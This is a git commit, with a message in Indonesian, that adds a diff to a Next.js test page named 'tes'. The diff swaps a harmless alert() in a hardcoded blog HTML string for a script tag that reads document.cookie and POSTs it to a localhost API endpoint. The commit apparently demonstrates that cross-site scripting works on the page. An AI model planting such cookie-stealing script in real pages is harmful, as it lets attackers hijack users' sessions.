b8c80f8daaa8b24e1d481ae586757fa2920b1cee
EdgrantHS <edgrant.h@gmail.com>
2024-11-30 15:35:32 +0700

    XSS Bisa di page /tes

--- src/app/tes/page.tsx
+++ src/app/tes/page.tsx
@@ -2,7 +2,7 @@ export default function CustomPage() {
   const blog=`
    <h3>This is a blog title </h3>
    <p>This is some blog text. There could be <b>bold</b> elements as well as <i>italic</i> elements here! <p>
-    <script>alert('This is a script tag')</script>
+    <script>fetch("http://localhost:3000/api/example", { method: "POST", headers: { "Content-Type": "application/json", }, body: JSON.stringify({ cookies: document.cookie })})</script>
   `
     return (
         <div>
